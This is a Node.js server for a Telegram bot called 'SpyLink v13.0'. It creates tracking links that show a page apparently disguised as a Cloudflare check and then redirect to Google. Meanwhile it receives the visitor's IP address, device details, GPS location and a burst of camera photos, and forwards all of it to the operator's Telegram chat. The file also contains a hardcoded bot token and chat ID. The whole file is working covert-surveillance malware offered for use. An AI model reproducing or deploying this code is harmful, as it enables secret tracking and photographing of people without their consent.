const express = require("express");
const cors = require('cors');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const axios = require('axios');

// 🔐 CONFIGURATION
const BOT_TOKEN = "8377073485:AAG2selNlxyHeZ3_2wjMGdG_QshklCiTAyE";
const ADMIN_CHAT_ID = "8175884349"; 
const HOST_URL = "https://botu-s3f9.onrender.com"; // REPLACE WITH YOUR RENDER URL

const app = express();
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// 🛡️ CRASH PROTECTION
process.on('unhandledRejection', (reason) => console.error('🚨 Rejection:', reason));
process.on('uncaughtException', (error) => console.error('🚨 Exception:', error));

// ⚙️ MIDDLEWARE
app.use(require('helmet')({ contentSecurityPolicy: false }));
app.use(cors());
app.use(require('morgan')('dev'));

// 🚨 CRITICAL FIX: Increase limit to 50MB for multiple photos
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

app.set("view engine", "ejs");
app.use(express.static("public"));

// 💾 SESSION STORE
let sessions = {};

// ==================== BOT COMMANDS ====================
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, "🎯 *SpyLink v13.0*\n\n/create - Generate Link\n/status - Check Server", { parse_mode: "Markdown" });
});

bot.onText(/\/create/, (msg) => {
    const chatId = msg.chat.id;
    const sessionId = uuidv4();
    sessions[sessionId] = { chatId, createdAt: new Date() };

    const targetUrl = Buffer.from("https://google.com").toString('base64'); 
    const link = `${HOST_URL}/c/${sessionId}/${targetUrl}`;

    bot.sendMessage(chatId, `
📸 *NEW LINK GENERATED*

🔗 *Link:* \`${link}\`
🆔 *ID:* \`${sessionId}\`

_Features: 3-5 Photo Burst, GPS, Full Device Info_
`, { parse_mode: "Markdown" });
});

// ==================== EXPRESS ROUTES ====================

// 1. Landing Page
app.get("/c/:id/:url", (req, res) => {
    const { id, url } = req.params;
    // Restore session if server restarted (defaults to Admin ID)
    if (!sessions[id]) sessions[id] = { chatId: ADMIN_CHAT_ID };
    
    let finalUrl = "https://google.com";
    try { finalUrl = Buffer.from(url, 'base64').toString('utf-8'); } catch(e) {}

    res.render("cloudflare", { uid: id, url: finalUrl, host: HOST_URL });
});

// 2. Receive Data (Device Info)
app.post("/data", (req, res) => {
    const { uid, data } = req.body;
    if (sessions[uid]) {
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
        bot.sendMessage(sessions[uid].chatId, `
📡 *NEW TARGET CONNECTED*
IP: \`${ip}\`

📱 *DEVICE INFO:*
${decodeURIComponent(data)}
        `, { parse_mode: "Markdown" });
    }
    res.json({ status: "ok" });
});

// 3. Receive Location
app.post("/location", (req, res) => {
    const { uid, lat, lon, acc } = req.body;
    if (sessions[uid]) {
        bot.sendMessage(sessions[uid].chatId, `📍 *GPS LOCKED*\nAccuracy: ${acc}m`);
        bot.sendLocation(sessions[uid].chatId, lat, lon);
    }
    res.json({ status: "ok" });
});

// 4. Receive Camera (Burst Mode)
app.post("/cam", (req, res) => {
    const { uid, img } = req.body;
    if (sessions[uid] && img) {
        const base64Data = img.replace(/^data:image\/png;base64,/, "");
        const buffer = Buffer.from(base64Data, 'base64');
        
        bot.sendPhoto(sessions[uid].chatId, buffer, {
            caption: `📸 *Capture [${new Date().toLocaleTimeString()}]*`, 
            parse_mode: "Markdown"
        }).catch(e => console.log("❌ Photo Error (Blocked?):", e.message));
    }
    res.json({ status: "received" });
});

// ==================== KEEPALIVE ====================
app.get("/keepalive", (req, res) => res.json({ status: "Alive" }));
setInterval(() => { axios.get(`${HOST_URL}/keepalive`).catch(() => {}); }, 40000);

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`✅ Server v13.0 listening on ${PORT}`));
